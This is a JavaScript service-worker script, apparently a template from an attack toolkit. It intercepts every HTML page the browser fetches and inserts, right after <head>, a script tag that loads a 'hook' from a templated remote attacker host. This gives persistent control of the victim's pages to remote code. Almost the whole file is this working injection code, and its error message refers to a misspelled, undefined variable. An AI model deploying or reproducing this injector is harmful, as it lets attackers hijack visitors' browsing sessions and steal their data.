/*
const injection = `<script>
window._injected = true;
console.log("Injected");
</script>`;
*/

const injection = '<script src="https://{{ hook_host }}:{{ hook_port_https }}/hook" type="text/javascript"></script>'

/*
console.log("ServiceWorker init");
self.addEventListener('install', function(e) {
  console.log('[ServiceWorker] Install');
});
self.addEventListener('activate', function(e) {
  console.log('[ServiceWorker] Activate');
});
*/

self.addEventListener("fetch", (event) => {
  event.respondWith((async () => {
    const response = await fetch(event.request);
    if (response.status !== 200 || event.request.destination !== "document") {
      return response;
    }
    const contentType = response.headers.get("Content-Type");
    if (!contentType || contentType.split(";")[0].toLowerCase() !== "text/html") {
      return response;
    }

    const body = await response.blob();
    const bodyText = await body.text();

    const anchor = "<head>"
    var anchorPos = bodyText.indexOf(anchor)
    if (anchorPos == -1) {
      console.log(`Failed to find ${achor}`);
      return response;
    }
    anchorPos += anchor.length;
    const newBodyText = bodyText.substring(0, anchorPos) + injection + bodyText.substring(anchorPos);
    return new Response(newBodyText, response);
  })());
});

